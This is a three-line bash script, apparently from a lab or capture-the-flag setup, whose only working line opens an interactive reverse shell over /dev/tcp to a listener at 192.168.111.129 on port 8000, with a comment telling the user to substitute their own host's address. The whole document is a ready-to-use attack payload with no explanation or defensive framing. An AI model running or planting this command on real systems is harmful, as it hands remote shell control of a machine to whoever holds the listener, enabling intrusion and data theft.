#!/bin/bash
# Replace 192.168.111.129 with the IP address of YOUR host machine
/bin/bash -i >& /dev/tcp/192.168.111.129/8000 0>&1
